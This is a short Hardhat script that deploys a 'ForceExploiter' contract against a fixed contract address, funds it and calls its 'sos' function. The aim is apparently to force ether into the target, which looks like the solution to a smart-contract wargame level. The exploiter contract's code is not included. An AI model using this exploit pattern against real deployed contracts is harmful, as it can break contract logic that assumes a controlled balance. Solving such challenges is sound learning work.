import "@nomiclabs/hardhat-waffle";
import {ethers} from "hardhat";
import utils from "web3-utils";
import hre from "hardhat";

async function main() {
    const prov = ethers.getDefaultProvider();
    const [owner] = await ethers.getSigners();
    console.log("Owner", owner.address);

    const ForceExploit = await ethers.getContractFactory("ForceExploiter");
    const forceExploit = await ForceExploit.deploy("0xf0eCA3745D1F88db3c4FDCeAfE23c2b0BDdaaB53");

    console.log("Force Exploiter Address: ", forceExploit.address);

    const tx = await forceExploit.deposit({value: 10000});
    await tx.wait();
    console.log("TX hash: ", tx.hash);
    const tx2 = await forceExploit.sos();
    await tx2.wait();
    console.log("TX 2 hash: " + tx2.hash);
    console.log("Force balance: ", await prov.getBalance("0xf0eCA3745D1F88db3c4FDCeAfE23c2b0BDdaaB53"));
  }
  
  main()
    .then(() => process.exit(0))
    .catch((error) => {
      console.error(error);
      process.exit(1);
    });
  